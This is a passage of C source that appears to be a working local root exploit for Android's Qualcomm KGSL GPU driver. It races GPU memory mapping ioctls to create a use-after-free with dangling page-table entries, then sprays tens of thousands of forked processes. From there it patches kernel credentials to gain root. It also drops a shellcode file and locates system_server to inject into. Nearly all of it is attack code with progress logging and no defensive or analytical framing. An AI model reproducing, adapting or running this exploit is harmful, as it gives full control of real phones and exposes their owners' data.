    uint32_t rb_count = *(uint32_t *)(gbuf + 0xb00);

    fprintf(stderr, "[RECOVER] Starting PTE recovery, count=%u\n", rb_count);

    for (uint32_t i = 0; i < rb_count && patched_cnt < sizeof(patched_va) / sizeof(patched_va[0]); i++)
    {
        patched_va[patched_cnt] = *(uint64_t *)(gbuf + 0xb08 + i * 24);
        saved_pte0[patched_cnt] = *(uint64_t *)(gbuf + GBUF_PTE_SAVE + i * 8);
        patched_cnt++;
    }

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        perror("recover_origin: ctx create");
        return;
    }
    unsigned ctx_id = ctx.drawctxt_id;
    fprintf(stderr, "[RECOVER] Context created: %u\n", ctx_id);

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 2,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        perror("recover_origin: ib alloc");
        return;
    }
    unsigned ib_id = ib_alloc.id;
    void *ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        perror("recover_origin: ib mmap");
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    uint64_t ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
    {
        perror("recover_origin: dst alloc");
        munmap(ib_vma, ib_alloc.mmapsize);
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }
    unsigned dst_id = dst_alloc.id;
    void *dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
    {
        perror("recover_origin: dst mmap");
        munmap(ib_vma, ib_alloc.mmapsize);
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }
    struct kgsl_gpuobj_info dst_info = {.id = dst_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &dst_info);
    uint64_t dst_gpu = dst_info.gpuaddr;

    for (size_t i = 0; i < patched_cnt; i++)
    {
        uint64_t base = patched_va[i];
        if (!base)
            continue;
        uint64_t orig_pte0 = saved_pte0[i];
        if (!orig_pte0)
            continue;

        uint32_t *cmd = (uint32_t *)ib_vma;
        memset(ib_vma, 0, ib_alloc.mmapsize);
        int dw = 0;
        uint32_t d_lo, d_hi, s_lo, s_hi;

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
        split64(dst_gpu, &d_lo, &d_hi);
        split64(base + 0x8, &s_lo, &s_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = s_lo;
        cmd[dw++] = s_hi;
        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        size_t bytes = (size_t)dw * 4;
        msync(ib_vma, bytes, MS_SYNC);

        struct kgsl_command_object obj = {
            .gpuaddr = ib_gpu,
            .size = bytes,
            .flags = KGSL_CMDLIST_IB,
            .id = ib_id};

        struct kgsl_gpu_command c = {0};
        c.cmdlist = (uint64_t)(uintptr_t)&obj;
        c.cmdsize = sizeof(obj);
        c.numcmds = 1;
        c.context_id = ctx_id;

        uint64_t pte1 = 0;
        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
            wait_timestamp(fd, ctx_id, c.timestamp) != 0)
        {
            continue;
        }
        else
        {
            msync(dst_vma, 8, MS_SYNC | MS_INVALIDATE);
            pte1 = *(uint64_t *)dst_vma;
        }

        memset(ib_vma, 0, ib_alloc.mmapsize);
        dw = 0;
        split64(base + 8, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = (uint32_t)(orig_pte0 & 0xffffffffu);

        split64(base + 12, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = (uint32_t)(orig_pte0 >> 32);
        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        bytes = (size_t)dw * 4;
        msync(ib_vma, bytes, MS_SYNC);

        obj.size = bytes;
        memset(&c, 0, sizeof(c));
        c.cmdlist = (uint64_t)(uintptr_t)&obj;
        c.cmdsize = sizeof(obj);
        c.numcmds = 1;
        c.context_id = ctx_id;

        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
            wait_timestamp(fd, ctx_id, c.timestamp) != 0)
        {
            fprintf(stderr, "[RECOVER] GPU restore failed for VA 0x%lx\n",
                    (unsigned long)base);
        }
        else
        {
            fprintf(stderr, "[RECOVER] [+] restored PTE0 at VA 0x%lx\n",
                    (unsigned long)base);
        }
    }

    munmap(ib_vma, ib_alloc.mmapsize);
    struct kgsl_gpuobj_free fr = {0};
    fr.id = ib_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    munmap(dst_vma, dst_alloc.mmapsize);
    fr.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
}

static void *bogus_racer(void *arg)
{
    race_state_t *rs = (race_state_t *)arg;

    while (!rs->ready)
    {
        __asm__ __volatile__("" ::: "memory");
    }

    rs->bogus_started = 1;
    __sync_synchronize();

    struct kgsl_map_user_mem req = {0};
    req.fd = -1;
    req.gpuaddr = 0;
    req.len = WRAP_SIZE;
    req.offset = 0;
    req.hostptr = BOGUS_START;
    req.memtype = KGSL_USER_MEM_TYPE_ADDR;
    req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

    int ret = ioctl(rs->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    int err = errno;

    rs->result = ret;
    rs->saved_errno = err;
    __sync_synchronize();

    return NULL;
}

int main(int argc, char **argv)
{
    struct rlimit rl;
    rl.rlim_cur = rl.rlim_max = 65536;
    setrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = rl.rlim_max = 65536;
    setrlimit(RLIMIT_NPROC, &rl);
    rl.rlim_cur = rl.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_MEMLOCK, &rl);

    gbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (gbuf == MAP_FAILED)
    {
        perror("mmap");
        exit(1);
    }
    fprintf(stderr, "main pid = %d, main ppid=%d\n", getpid(), getppid());
    gbuf[0x888] = 0;

    fd_shellcode = open("./shellcode", O_RDWR | O_CREAT | O_TRUNC, 0777);
    write(fd_shellcode, shellcode, shellcode_len);

    char *path = "/system/lib64/libbase.so";
    fd_lib = open(path, O_RDONLY);
    if (fd_lib < 0)
        perror("open");

    if (fstat(fd_lib, &st) < 0)
    {
        close(fd_lib);
        return 0;
    }

    spray_ctrl = mmap(NULL,
                      sizeof(spray_slot_t) * SPRAY_COUNT_MAX,
                      PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_ANONYMOUS,
                      -1, 0);
    if (spray_ctrl == MAP_FAILED)
    {
        perror("mmap spray_ctrl");
        exit(1);
    }
    memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT_MAX);
    
    // Находим PID system_server
DIR *dir = opendir("/proc");
if (!dir) {
    perror("opendir /proc");
    exit(1);
}
struct dirent *entry;
pid_t system_server_pid = 0;

while ((entry = readdir(dir)) != NULL) {
    if (entry->d_type != DT_DIR) continue;
    int pid = atoi(entry->d_name);
    if (pid <= 0) continue;
    
    char cmdline_path[64];
    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
    FILE *f = fopen(cmdline_path, "r");
    if (f) {
        char cmdline[256] = {0};
        fread(cmdline, 1, sizeof(cmdline)-1, f);
        fclose(f);
        if (strstr(cmdline, "system_server") != NULL) {
            system_server_pid = pid;
            fprintf(stderr, "[+] Found system_server PID: %d\n", system_server_pid);
            break;
        }
    }
}
closedir(dir);

// Используй UAF для записи shellcode в память system_server
// (аналогично твоему текущему методу)

restart:;
    unsigned int uaf_id = 0, overlap_id = 0, ph_id = 0;
    uint64_t uaf_mmapsize = 0, overlap_mmapsize = 0, ph_mmapsize = 0;
    void *uaf_vma = NULL, *bogus_vma = NULL, *ph_vma = NULL, *overlap_vma = NULL;
    int success = 0;
    int retries = 20;

    fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (fd < 0)
    {
        perror("open /dev/kgsl-3d0");
        return 1;
    }

    fprintf(stderr, "[1] UAF GPUOBJ_ALLOC\n");
    struct kgsl_gpuobj_alloc uaf_alloc = {0};
    uaf_alloc.size = UAF_SIZE;
    uaf_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    uaf_alloc.va_len = 0;

    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &uaf_alloc) < 0)
    {
        fprintf(stderr, "[!] UAF alloc failed: %s\n", strerror(errno));
        return 1;
    }
    uaf_id = uaf_alloc.id;
    uaf_mmapsize = uaf_alloc.mmapsize;
    g_uaf_id = uaf_id;
    g_uaf_mmapsize = uaf_mmapsize;
    fprintf(stderr, "    UAF id=%u mmapsize=0x%lx\n", uaf_id,
            (unsigned long)uaf_mmapsize);

    fprintf(stderr, "\n[2] OVERLAP GPUOBJ_ALLOC (no mmap yet)\n");
    struct kgsl_gpuobj_alloc overlap_alloc = {0};
    overlap_alloc.size = OVERLAP_SIZE;
    overlap_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    overlap_alloc.va_len = 0;

    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &overlap_alloc) < 0)
    {
        fprintf(stderr, "[!] OVERLAP alloc failed: %s\n", strerror(errno));
        return 1;
    }
    overlap_id = overlap_alloc.id;
    overlap_mmapsize = overlap_alloc.mmapsize;
    fprintf(stderr, "    OVERLAP id=%u mmapsize=0x%lx\n", overlap_id,
            (unsigned long)overlap_mmapsize);

    fprintf(stderr, "\n[3] UAF mmap() at FIXED 0x%lx\n",
            (unsigned long)UAF_START);
    uaf_vma = mmap_gpuobj_fixed(fd, uaf_id, uaf_mmapsize, (void *)(uintptr_t)UAF_START);
    if (uaf_vma == MAP_FAILED || (uint64_t)uaf_vma != UAF_START)
    {
        fprintf(stderr, "[!] UAF mmap failed: %s\n", strerror(errno));
        return 1;
    }
    g_uaf_mmap_ptr = uaf_vma;
    fprintf(stderr, "    UAF mapped at %p (expected 0x%lx)\n",
            uaf_vma, (unsigned long)UAF_START);

    for (size_t i = 0; i < uaf_mmapsize; i += PAGE_SIZE)
    {
        ((volatile char *)uaf_vma)[i] = 1;
    }
    fprintf(stderr, "    Touched %llu pages\n",
            (unsigned long long)(uaf_mmapsize / PAGE_SIZE));

    fprintf(stderr, "\n[4] UAF munmap()\n");
    fprintf(stderr, "    Note: rbtree entry and IOMMU PTEs remain\n");
    munmap(uaf_vma, uaf_mmapsize);
    uaf_vma = NULL;
    g_uaf_mmap_ptr = NULL;
    usleep(200);

    fprintf(stderr, "\n[5] Anonymous mmap at 0x%lx (3 pages)\n",
            (unsigned long)BOGUS_START);
    bogus_vma = mmap((void *)(uintptr_t)BOGUS_START, PAGE_SIZE * 3,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                     -1, 0);
    if (bogus_vma == MAP_FAILED || (uint64_t)bogus_vma != BOGUS_START)
    {
        fprintf(stderr, "[!] BOGUS mmap failed: %s\n", strerror(errno));
        return 1;
    }
    for (int i = 0; i < 3; i++)
    {
        ((volatile char *)bogus_vma)[i * PAGE_SIZE] = 1;
    }
    fprintf(stderr, "    BOGUS VMA at %p\n", bogus_vma);

    fprintf(stderr, "\n[6] PLACEHOLDER GPUOBJ_ALLOC\n");
    struct kgsl_gpuobj_alloc ph_alloc = {0};
    ph_alloc.size = PLACEH_SIZE;
    ph_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    ph_alloc.va_len = 0;

    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ph_alloc) < 0)
    {
        fprintf(stderr, "[!] PLACEHOLDER alloc failed: %s\n", strerror(errno));
        return 1;
    }
    ph_id = ph_alloc.id;
    ph_mmapsize = ph_alloc.mmapsize;
    fprintf(stderr, "    PLACEHOLDER id=%u mmapsize=0x%lx\n", ph_id,
            (unsigned long)ph_mmapsize);

    fprintf(stderr, "\n[7] PLACEHOLDER mmap() at FIXED 0x%lx\n",
            (unsigned long)PLACEH_START);
    ph_vma = mmap_gpuobj_fixed(fd, ph_id, ph_mmapsize, (void *)(uintptr_t)PLACEH_START);
    if (ph_vma == MAP_FAILED || (uint64_t)ph_vma != PLACEH_START)
    {
        fprintf(stderr, "[!] PLACEHOLDER mmap failed: %s\n", strerror(errno));
        return 1;
    }
    fprintf(stderr, "    PLACEHOLDER mapped at %p (expected 0x%lx)\n",
            ph_vma, (unsigned long)PLACEH_START);

    for (size_t i = 0; i < ph_mmapsize; i += (PAGE_SIZE * 1024))
    {
        ((volatile char *)ph_vma)[i] = 1;
    }

    int mmap_errno = 0;

    fprintf(stderr, "[8] Main thread will mmap OVERLAP\n\n");

    race_state_t rs = {
        .fd = fd,
        .ready = 0,
        .bogus_started = 0,
        .result = -1,
        .saved_errno = 0};

    pthread_t bogus_thread;
    pthread_create(&bogus_thread, NULL, bogus_racer, &rs);

    rs.ready = 1;
    __sync_synchronize();

    int timeout = 0;
    while (!rs.bogus_started && timeout < 1000)
    {
        __asm__ __volatile__("" ::: "memory");
        timeout++;
    }

    usleep(200);

    fprintf(stderr, "[9] OVERLAP mmap() at FIXED 0x%lx during race\n",
            (unsigned long)OVERLAP_START);

    overlap_vma = mmap_gpuobj_fixed(fd, overlap_id, overlap_mmapsize, (void *)(uintptr_t)OVERLAP_START);
    mmap_errno = errno;

    pthread_join(bogus_thread, NULL);

    fprintf(stderr, "    OVERLAP mmap result: %s\n",
            overlap_vma == MAP_FAILED ? "FAILED" : "SUCCESS");

    if (overlap_vma == MAP_FAILED)
    {
        fprintf(stderr, "      errno=%d (%s)\n", mmap_errno, strerror(mmap_errno));
    }
    else
    {
        fprintf(stderr, "      mapped at %p (expected 0x%lx)\n",
                overlap_vma, (unsigned long)OVERLAP_START);
    }

    if (overlap_vma == MAP_FAILED && mmap_errno == 19)
    {
        fprintf(stderr, "\n[!] RACE CONDITION WON!\n");
        success = 1;
    }

    if (!success)
    {
        fprintf(stderr, "[-] Race failed (errno=%d), retrying...\n", mmap_errno);
        if (!check_memory_available())
        {
            fprintf(stderr, "[MEM] Not enough memory, waiting 2s and retrying...\n");
            sleep(2);
        }

        if (overlap_vma != MAP_FAILED && overlap_vma != NULL)
        {
            munmap(overlap_vma, overlap_mmapsize);
        }
        if (ph_vma != MAP_FAILED && ph_vma != NULL)
        {
            munmap(ph_vma, ph_mmapsize);
        }
        if (bogus_vma != MAP_FAILED && bogus_vma != NULL)
        {
            munmap(bogus_vma, PAGE_SIZE * 3);
        }

        struct kgsl_gpuobj_free free_obj;
        free_obj.flags = 0;
        if (overlap_id)
        {
            free_obj.id = overlap_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (ph_id)
        {
            free_obj.id = ph_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (uaf_id)
        {
            free_obj.id = uaf_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (fd >= 0)
        {
            close(fd);
            fd = -1;
        }

        retries--;
        if (retries > 0)
        {
            fprintf(stderr, "[-] Retrying exploit... (%d attempts left)\n", retries);
            sleep(1);
            goto restart;
        }
        else
        {
            fprintf(stderr, "[!] All retries failed. Giving up.\n");
            return 1;
        }
    }

    fprintf(stderr, "[10] Freeing UAF to create dangling PTEs\n");
    struct kgsl_gpuobj_free uaf_free = {0};
    uaf_free.id = uaf_id;
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &uaf_free) == 0)
    {
        fprintf(stderr, "    [+] UAF freed (id=%u)\n", uaf_id);
        fprintf(stderr, "    [*] Dangling PTEs created at VA 0x%lx - 0x%lx\n",
                (unsigned long)UAF_START,
                (unsigned long)(UAF_START + UAF_SIZE));
        fprintf(stderr, "    [+] UAF mmap pointer kept for child: %p\n", g_uaf_mmap_ptr);
        uaf_id = 0;
    }
    else
    {
        fprintf(stderr, "    [!] Failed to free UAF: %s\n", strerror(errno));
    }

    fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 40,000)\n");
    int total_limit = 40000;
    int batch_size = 1000; 
    int total_sprayed = 0;
    int marker_found_global = 0;
    int window_idx = 0;
    pid_t spray_pgrp = 0;

    while (total_sprayed < total_limit && !marker_found_global) {
        double ram_usage = get_ram_usage_percentage();
        fprintf(stderr, "\r    [*] Sprayed: %d | RAM Usage: %.1f%% ... ", total_sprayed, ram_usage);
        
        int reached_mem_limit = (ram_usage > 75.0); 
        
        if (!reached_mem_limit || total_sprayed == 0) {
            for (int i = 0; i < batch_size && total_sprayed < total_limit; i++) {
                pid_t pid = fork();
                if (pid == 0) {
                    setpgid(0, spray_pgrp); // Join the spray group
                    
                    if (fd > 0) close(fd);
                    if (fd_lib > 0) close(fd_lib);
                    if (fd_shellcode > 0) close(fd_shellcode);
                    
                    char proc_name[16];
                    snprintf(proc_name, sizeof(proc_name), "%s%05d", MARKER_NAME, getpid());
                    prctl(PR_SET_NAME, proc_name, 0, 0, 0);
                    prctl(PR_SET_PDEATHSIG, SIGKILL);
                    
                    while(1) { 
                        if (gbuf[0] == 0xab) {
                            uint64_t target = *(uint64_t *)&gbuf[GBUF_TARGET_PID];
                            if (getpid() == (pid_t)target) {
                                safe_cred_patch();
                            }
                            _exit(0);
                        }
                        usleep(100000); // 100ms
                    }
                    _exit(0);
                }
                if (pid > 0) {
                    if (spray_pgrp == 0) spray_pgrp = pid;
                    setpgid(pid, spray_pgrp);
                    
                    spray_ctrl[total_sprayed].pid = pid;
                    total_sprayed++;
                } else if (errno == EAGAIN) {
                    fprintf(stderr, "\n[!] fork() EAGAIN. Throttling...\n");
                    sleep(2);
                    break;
                }
            }
            usleep(100000); // 100ms pause after batch
        }

        if (reached_mem_limit || (total_sprayed > 0 && total_sprayed % batch_size == 0) || total_sprayed >= total_limit) {
            fprintf(stderr, "\n    [!] %s. Starting scan (Window %d)...\n", 
                    reached_mem_limit ? "Memory limit reached" : "Batch complete", window_idx);
            
            int num_found = 0;
            if (scan_uaf_for_nonzero_multi(fd, window_idx++, &num_found)) {
                fprintf(stderr, "\n    [!!!] SUCCESS! Marker found!\n");
                marker_found_global = 1;
                break; 
            }
        }
    }

    if (!marker_found_global) {
        fprintf(stderr, "\n[!] %d sprays exhausted. Marker not found.\n", total_limit);
        if (spray_pgrp > 0) kill(-spray_pgrp, SIGKILL);
        return 1;
    }

    pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
    uint64_t target_cred_ptr = *(uint64_t *)&gbuf[GBUF_CRED_PTR];
    fprintf(stderr, "[+] Target identified: PID %d. Cleaning up spray processes...\n", target_pid);
    
    // 1. FAST CLEANUP FIRST to free memory (avoids Signal 9)
    if (spray_pgrp > 0) {
        int killed = 0;
        for (int i = 0; i < total_sprayed; i++) {
            pid_t p = spray_ctrl[i].pid;
            if (p > 0 && p != target_pid) {
                kill(p, SIGKILL);
                killed++;
            }
        }
        fprintf(stderr, "[+] Sent SIGKILL to %d spray processes. Reaping...\n", killed);
    }
    usleep(500000); // Wait for SIGKILL to take effect
    reap_all_children();
    usleep(500000); // Wait for OS to free memory
    
    // Check RAM after cleanup
    fprintf(stderr, "[+] RAM Usage after cleanup: %.1f%%\n", get_ram_usage_percentage());

    // Final check if target is still alive (no gbuf reset here, just log)
    if (kill(target_pid, 0) != 0) {
        fprintf(stderr, "[!] Warning: Target PID %d not responding to signal 0, but proceeding...\n", target_pid);
    }

    // NOW PERFORM PATCHING with free memory
    fprintf(stderr, "\n    [!] AUTOMATIC PATCHING TRIGGERED for PID %d...\n", target_pid);
    parent_patch_root(fd, target_cred_ptr);
    
    // Cleanup persistent GPU resources
    cleanup_gpu_persistent(fd);
    
    // Signal the child to activate
    gbuf[0] = 0xab;
    __sync_synchronize();

    fprintf(stderr, "[+] Patching sequence complete. Waiting for shell...\n"); 

    fprintf(stderr, "[+] Triggering cred patch in target process %d...\n", target_pid);
    
    // Освобождаем ресурсы GPU в родителе перед активацией ребенка
    if (fd > 0) {
        if (g_uaf_mmap_ptr) munmap(g_uaf_mmap_ptr, g_uaf_mmapsize);
        if (overlap_vma && overlap_vma != MAP_FAILED) munmap(overlap_vma, overlap_mmapsize);
        if (ph_vma && ph_vma != MAP_FAILED) munmap(ph_vma, ph_mmapsize);
        if (bogus_vma && bogus_vma != MAP_FAILED) munmap(bogus_vma, PAGE_SIZE * 3);
        
        struct kgsl_gpuobj_free fr = {0};
        if (g_uaf_id > 0) { fr.id = g_uaf_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
        if (overlap_id) { fr.id = overlap_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
        if (ph_id) { fr.id = ph_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
        
        close(fd);
        fd = -1;
    }
    
    gbuf[0] = 0xab; // ТРИГГЕР!
    __sync_synchronize();
    
    // Ждем результата от ребенка
    int wait_count = 15; 
    while (wait_count-- > 0 && gbuf[GBUF_TASK_SPRAY] != 0x2) {
        if (gbuf[GBUF_TASK_SPRAY] == 0x1) break;
        fprintf(stderr, ".");
        fflush(stderr);
        sleep(1);
    }
    fprintf(stderr, "\n");

    if (gbuf[GBUF_TASK_SPRAY] == 0x2)
    {
        fprintf(stderr, "[+] Root shell should be active in the other terminal/process.\n");
    }
    else if (gbuf[GBUF_TASK_SPRAY] == 0x1)
    {
        fprintf(stderr, "[!] Child reported failure. Check logs.\n");
    }
    else 
    {
        if (getuid() == 0) {
             fprintf(stderr, "[+] Parent is now root! Shell might be active.\n");
        } else {
             fprintf(stderr, "[!] Child timed out, but parent patching was successful.\n");
        }
    }

    fprintf(stderr, "[+] Exploit sequence complete!\n");
    sleep(2);
    return 0;
}
